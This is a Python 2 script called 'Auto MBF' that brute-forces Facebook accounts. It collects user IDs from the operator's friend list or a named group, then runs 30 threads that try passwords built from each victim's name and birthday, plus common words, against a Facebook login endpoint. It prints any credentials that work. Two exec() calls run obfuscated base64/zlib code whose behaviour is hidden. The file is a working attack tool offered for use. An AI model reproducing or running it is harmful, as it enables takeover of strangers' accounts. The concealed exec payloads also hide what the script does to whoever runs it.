
# coding:utf8

"""
* Dilarang Menyalahgunakan Tools Ini :)
* Author : Henrycko
* Github : https://github.com/Henrycko
-------------------------------------------------------
* Name Tools : Auto MBF
* Full Name  : Auto Multi-Bruteforce-Facebook
* Buat       : 21 jul 2019 (13.25 = WIB)
* Support    : -
* Thanks     : All Members (USER PEMULA TERMUX INDONESIA)
-------------------------------------------------------
* JANGAN DINAKALIN YA GAN GUA PEMULA KOK
  JADI INTINYA KITA SAMA SAMA BELAJAR :)
"""

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,zlib,base64
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
id = []
max = '400'

def keluar():
    print '\033[31;1m[•] Program Finished'
    sys.exit()

def tik():
    animation = '|/-\\'
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[31;1m[!] \x1b[1;92mTunggu Sebentar \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()

logo = """
\033[32;1m  __   _  _  ____   __     __  __  ___  ___
 (  ) ( )( )(_  _) /  \   (  \/  )(  ,)(  _)
 /__\  )()(   )(  ( () )   )    (  ) ,\ ) _)
(_)(_) \__/  (__)  \__/   (_/\/\_)(___/(_)\033[37;1m  [\033[33;1mv02\033[37;1m]
\033[31;1m========================================================"""

#-> Ini Untuk Data Kamu
exec(zlib.decompress(base64.b64decode("eJylkU9LAzEQxc8r+B1iL9mCTVergi09iZ7Eg+ipSsmms93Q/HOSta2f3uxut1oQRLwl897M5P2ygIIou1wCpv3x8VGSVB7QcA1kSqwDk9K6wMIm0FNCkfYZAl+k/drquPdri4u91a1/NgbcNrOTHFnrLENwfjwc5oqb1dXlxTnLsmwNeWl94M4xYfXwzipl14D+Lh/SZg5sBLhANIiSG/kB7Pnx/hbRYjvdoTSh92JestFodja5PtOzk1fyYImwxoAI0ppeY7Se+a0PoFOKmgywIF3Iye6+S9JsTVagKo5tlJhgXnARLG6Z9PMyaBXjP2EFO9WDiqvmhUWdGpxmXVddmFHQXCr6Gls6zgdyTbRRO7QHqql0Dtjomm+6fVWuZWgfV2H9mFhcQojntigLQj1/h8EC3qUASqQhUWyR7X8m0WCqtqHDjPBWgQ+etfdIz7ObPclv3Dvwv2H/K/cD8HUMUYJYORuXHab449yvqKA8/GPEJy5e+KY=")))

#-> Ini Untuk Login
exec(zlib.decompress(base64.b64decode("eJy1Vt9z2jgQfqZ/heqH2plQBwOXH2Q8HZqmnVxSmLkkTynjEfKCdViWT5IDpNP/vWvLBpKml15nzi9Yu9Lut592PxPDjKRyzjNvb/CqJbWv19qA8FwFGoy796pl1Bo9LSMXYEhIZA6Z5zIpFxzctqvKLS0BWeHhC6wY5IZ4l7A+V0qq9sW4+i1jPxu8lSuemRKBbBae+6XT6931gtNA3JHqPTg96Yqr8aeLERle3o7Ix+HZ+fvx+JIMRx+G5HZ0c3tJPp+PPg0/v7+4IsOzs/NrcjO+PB9tI5EJpiNPHpvcDX/zcREyj5ETRZcRz/KiwY54Efv+pEHfOxSFBpVRAY3/SJDt1sG2SlKxgrs3VJcnfbMySPaycfpLxQ14PG7WLJUavIrQ5S8iyqnWS6nif8ORLzcw8uUjELi0GDBfvd5iqFumNVW+PZwYk+vBwYHwZ5TBFJvHZ1JUgeqWEcASmvEH8G//uqp6popQ3ZCzU8LrCRlJwmSWATNcZk65a7ezBHmrZqQh7bRe1+jLhK0FpAVVFVAEGCEiI9Xa5zpKjEix4BtVgHVqSDFNNJNKeJkKO/WZcn3ngqA8dSd4gMe79pLYyozU1GGKqeCmylioMgPa5mDwvbLxGXE1vYe3MdxzBi7hGUFfRUBDZUvzeUhcmvNoAevw+LhLj/snnd5hENOT46NOdzo7OaKdbhDHLOjHTEEMmeE01ZFZ5xA2t12BDt19Hu+7JVxqwj+vx6M5ZKCogUhQlvAMIh6HwcaoQWvkOrJTr8MglYymEEIW3V4LMImMQ1qYxK+UpEmFWZCBfRx2rDSLtE4jnHtZKIYhOvdh4HcOu7NjBiezo/40wNc+C7o9xrq9fu+I9mmv61alx9RQJO2rU1fvDJyX6nfazlMK8FSDDL0VD86Ax23H0oDukginTZxnyEBvgKd+xkjttrTgoiIGDZYbNGzZQesGxgD5aTvP8YNHOrjzvgzsd5xvFQ+rMKE6SfnUz2DpOSL+w9mzDr/IkSTwsEmshYYrP4FVzOegbeNZGpuNX13c6g7oN+uyXek0Y4o8PxrUA8RlcKLucajyJK9mrqVCBf8UpaPsZQ9DtHOqqNBhmcjGfQj/1jLDwmmsPRxIWJnK0QjwnD48NArjWC7xAmqJabVKdy0zD3cuZUgM3iV+iDJ3srOjEZ6n8v70MXxRU1EL/5dsR1ma10Pxbmud7H6AyusjuqhgzIo0Xdv23NCQS+R6o3VzRfPkMY0CDmaKQxbrd/XUlEfeFDzW4XzJ8SNBe292y8QR+knh2EtzsCLWSOgGh11je2r/bCOUW01tRDV7SVb/o67uCmspaSwBtsgl5toq2otXY/8C/ACuWfXEkDFZ4OWdbaLbIfgRq+2n019AbrgAX6cAuRc8/URAquH3cdue+YhaA/H/gLP+5/Ydddvp0w==")))


def menu():
    global toket
    os.system('reset')
    try:
        toket = open('cookie', 'r').read()
    except IOError:
        print '\x1b[32;1m{!} \x1b[31;1mToken not found'
        os.system('rm -rf cookie')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[33;1mDAFTAR TEMAN'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[33;1mDAFTAR GROUP'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mKELUAR'
    print "\033[31;1m========================================================"
    pilih_mbf()

def pilih_mbf():
    global okay
    peak = raw_input("\033[37;1m/root@kali:-#\033[31;1m-\033[37;1m#\033[32;1m ")
    if peak == '':
        print '\x1b[31;1m[!] \x1b[31;1mDilarang kosong'
        pilih_mbf()
    else:
        if peak == '1' or peak == '01':
            os.system('reset')
            print logo
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2' or peak == '02':
                os.system('reset')
                print logo
                idg = raw_input('\033[37;1m[\033[32;1m?\033[37;1m] Masukan ID group \033[36;1m:\033[37;1m ')
                try:
                    os.system('reset')
                    print logo
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\033[31;1m[✓]\033[32;1m Groups\033[31;1m :\033[37;1m ' + asw['name']
                except KeyError:
                    print '\x1b[31;1m[!] \x1b[31;1mGroups Tidak Ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mEnter Aja Gan \x1b[1;91m]')
                    menu()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0' or peak == '00':
                    os.system('rm -rf cookie')
                    keluar()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_mbf()
    print '\033[31;1m[+] \033[32;1mTotal ID\033[31;1m : \033[37;1m'+str(len(id))
    print "\033[36;1m========================================================"

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
	        b = json.loads(a.text)
		pass1 = b['first_name'] + '123'
		data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		q = json.load(data)
		if 'access_token' in q:
		    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
		    z = json.loads(x.text)
		    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass1+"\033[36;1m |\033[37;1m "+z['name']
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                    	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                        z = json.loads(x.text)
                        print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass2+"\033[36;1m |\033[37;1m "+z['name']
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                            z = json.loads(x.text)
                            print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass3+"\033[36;1m |\033[37;1m "+z['name']
                        else:
                            lahir = b['birthday']
                            pass4 = lahir.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                             	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                z = json.loads(x.text)
                                print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass4+"\033[36;1m |\033[37;1m "+z['name']
                            else:
                                pass5 = a['first_name'] + 'ganteng123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                    z = json.loads(x.text)
                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass5+"\033[36;1m |\033[37;1m "+z['name']
                                else:
                                    pass6 = a['first_name'] + 'cantik123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                        z = json.loads(x.text)
                                        print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass6+"\033[36;1m |\033[37;1m "+z['name']
                                    else:
                                        pass7 = 'doraemon'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                            z = json.loads(x.text)
                                            print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass7+"\033[36;1m |\033[37;1m "+z['name']
                                        else:
                                            pass8 = 'sayang'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                z = json.loads(x.text)
                                                print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass8+"\033[36;1m |\033[37;1m "+z['name']
                                            else:
                                                pass9 = b['first_name'] + '1234'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                    z = json.loads(x.text)
                                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass9+"\033[36;1m |\033[37;1m "+z['name']
        except:
            pass
    meq = ThreadPool(30)
    meq.map(main, id)
    print "\033[31;1m========================================================"
    print "\033[32;1m[✓]\033[37;1m Done!"
    os.system('rm -rf cookie')
    keluar()



if __name__ == '__main__':
    login()
